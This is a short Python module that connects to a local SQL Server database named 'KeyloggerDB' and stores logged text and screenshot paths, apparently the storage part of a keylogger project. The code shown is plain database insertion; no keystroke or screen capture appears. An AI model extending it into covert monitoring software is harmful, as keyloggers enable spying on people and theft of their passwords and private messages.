import pyodbc

server = 'LAPTOP-JNKD4GK8\\SQLEXPRESS'
database = 'KeyloggerDB'

def create_connection():
    conn = pyodbc.connect(f'DRIVER={{SQL Server}};SERVER={server};DATABASE={database};Trusted_Connection=yes;')
    return conn

def insert_log(log):
    conn = create_connection()
    cursor = conn.cursor()
    cursor.execute("INSERT INTO Logs (log) VALUES (?)", (log,))
    conn.commit()
    conn.close()

def insert_screenshot(path):
    conn = create_connection()
    cursor = conn.cursor()
    cursor.execute("INSERT INTO Screenshots (path) VALUES (?)", (path,))
    conn.commit()
    conn.close()
